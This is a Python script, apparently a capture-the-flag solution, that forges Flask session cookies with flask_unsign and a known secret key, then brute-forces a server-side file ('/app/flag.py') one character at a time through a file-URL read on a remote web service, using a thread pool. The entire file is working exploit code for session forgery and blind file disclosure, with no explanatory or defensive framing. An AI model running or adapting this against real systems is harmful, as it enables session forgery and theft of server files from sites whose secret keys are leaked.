import flask_unsign
from concurrent import futures
from concurrent.futures import as_completed
from requests_html import HTMLSession
from concurrent.futures import ThreadPoolExecutor, FIRST_COMPLETED
import concurrent.futures.thread
from queue import Queue

base_url = 'http://1.14.71.254:28003'
# base_url = 'http://localhost:5000'
success_text = 'you get it'

quit_proc = False
s = HTMLSession()


def optimize_chars():  # 优化字符串, 小写和空格放前面了
    from string import ascii_lowercase as al
    chars = '\n'
    for i in range(32, 128):
        chars += chr(i)

    chars = ' ' + al + chars.replace(al, '').replace(' ', '')
    return chars


chars = optimize_chars()


def thread_test():
    q = Queue()
    flag = """def wa"""

    def foo(c, flagin):
        global quit_proc
        while True:
            q.task_done()
            # print('q size', q.qsize(), '===', 'quit_proc -', quit_proc, end='')
            if quit_proc:
                return

            txt = flagin + c
            data = {'admin': False, 'data': txt.encode(), 'url': 'FILE:///app/flag.py'}  # work
            secret = open('key.txt', 'r').read()
            s.cookies.clear()
            session = flask_unsign.sign(data, secret)
            cookies = {"session": session}

            url = '%s/get_hindd_result' % base_url
            res = s.get(url, cookies=cookies)

            if success_text in res.text:
                flagin += c
                print(f'char:{c}, flag = {flagin}')
                quit_proc = True
                return flagin
            else:
                if ord(c) == 127:
                    exit(0)
                print(f'{c}, {res.text}')
                return None

    while True:
        global quit_proc
        quit_proc = False
        [q.put(i) for i in chars]
        with ThreadPoolExecutor(max_workers=8) as executor:
            futures = []
            while not q.empty():
                future = executor.submit(foo, q.get(), flag)
                futures.append(future)
            concurrent.futures.wait(futures, timeout=2, return_when=concurrent.futures.FIRST_COMPLETED)
            for future in as_completed(futures):
                if val := future.result():
                    if val == flag:
                        exit(0)
                    flag = val
                    executor.shutdown(wait=False)
        q.join()
        # print('queue done 1=============')


if __name__ == '__main__':
    thread_test()
